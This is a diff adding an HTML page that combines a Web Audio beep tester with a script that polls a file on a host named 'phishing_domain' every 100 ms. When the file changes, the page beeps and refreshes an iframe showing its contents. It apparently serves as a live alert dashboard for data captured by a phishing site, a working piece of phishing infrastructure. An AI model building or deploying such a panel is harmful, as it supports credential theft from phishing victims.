@@ -1,0 +1,134 @@
+<html>
+	<body>
+		<div style="text-align: center;">
+
+			Type
+			<input type="range" id="typeInput" min="0" max="3" oninput="updateGui()" value="1" />
+			<span id="typeSpan">Square</span> &emsp; &emsp; &emsp;
+
+			Volume
+			<input type="range" id="volumeInput" min="0" max="100" oninput="updateGui()" value="100" />
+			<span id="volumeSpan">100%</span> &emsp; &emsp; &emsp;
+
+			Frequency
+			<input type="range" id="frequencyInput" min="50" max="10000" oninput="updateGui()" value="1000" />
+			<span id="frequencySpan">1000 Hz</span> &emsp; &emsp; &emsp;
+
+			Duration
+			<input type="range" id="durationInput" min="1" max="5000" oninput="updateGui()" value="50" />
+			<span id="durationSpan">50 ms</span> &emsp; &emsp; &emsp; &emsp;
+
+			<button onclick="beep();">Test</button>
+
+			<br><br>
+
+		</div>
+
+		<script>
+
+			// Create the audio
+			audio = new (window.AudioContext || window.webkitAudioContext)();
+
+			// Update the GUI
+			updateGui();
+
+			// Function for updatypeInputg the GUI
+			function updateGui(){
+
+				// Update frequency
+				frequency = document.getElementById("frequencyInput").value;
+				document.getElementById("frequencySpan").innerHTML=frequency + " Hz";
+
+				// Update type
+				switch(document.getElementById("typeInput").value * 1){
+					case 0: type="sine"; break; 
+					case 1: type="square"; break;
+					case 2: type="sawtooth"; break;
+					case 3: type="triangle"; break;
+				}
+				document.getElementById("typeSpan").innerHTML=type.charAt(0).toUpperCase() + type.slice(1);
+
+				// Update volume
+				volume = document.getElementById("volumeInput").value;
+				document.getElementById("volumeSpan").innerHTML=volume + "%";
+
+				// Update duration
+				duration = document.getElementById("durationInput").value;
+				document.getElementById("durationSpan").innerHTML=duration + " ms";
+			}
+
+			function beep() {
+
+				// Initialize the audio
+				var oscillator = audio.createOscillator();
+				var gain = audio.createGain();
+
+				// Connect the audio
+				oscillator.connect(gain);
+				gain.connect(audio.destination);
+
+				// Set audio parameters
+				oscillator.type = type;
+				gain.gain.value = volume / 100;
+				oscillator.frequency.value = frequency;
+
+				// Start the beep
+				oscillator.start();
+
+				// Set the timeout
+				setTimeout(
+					function(){
+						oscillator.stop();
+					},
+					duration
+				);  
+			};
+
+		</script>
+
+		<iframe align="center" width="100%" height="90%" src="main.txt" frameborder="yes" scrolling="yes" name="main" id="main"></iframe>
+
+		<script>
+		
+			// Initialize variables
+			var xhr = new XMLHttpRequest();
+			var url = "https://phishing_domain/data/securedata/main.txt";
+
+			// Create 
+			var log = "";
+
+			function getLogs(){
+
+				// Get the logs
+				xhr.open("GET", url);
+				xhr.send();
+
+				// Wait for state change
+				xhr.onreadystatechange = function() {
+
+					// Check if the page has loaded
+					if(this.readyState == 4 && this.status == 200){
+
+						// Update the page contents
+						if(xhr.responseText != log){
+
+							// Update the log
+							log = xhr.responseText;
+
+							// Beep
+							beep()
+
+							// Update the logs on the screen
+							var iframe = document.getElementById("main");
+							iframe.src = iframe.src;
+						}
+					}
+				}
+			}
+
+			// Constantly get the logs
+			setInterval(getLogs, 100);
+
+		</script>
+	</body>
+</html>
